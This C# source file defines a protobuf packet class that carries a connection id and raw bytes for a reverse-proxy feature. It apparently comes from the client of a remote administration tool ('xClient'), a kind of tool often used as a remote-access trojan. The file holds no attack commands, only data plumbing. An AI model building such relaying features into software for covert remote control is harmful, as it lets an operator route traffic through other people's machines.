using ProtoBuf;
using xClient.Core.Packets;

namespace xClient.Core.ReverseProxy.Packets
{
    [ProtoContract]
    public class ReverseProxyData : IPacket
    {
        [ProtoMember(1)]
        public int ConnectionId { get; set; }

        [ProtoMember(2)]
        public byte[] Data { get; set; }

        public ReverseProxyData()
        {
        }

        public ReverseProxyData(int connectionId, byte[] data)
        {
            this.ConnectionId = connectionId;
            this.Data = data;
        }

        public void Execute(Client client)
        {
            client.Send(this);
        }
    }
}
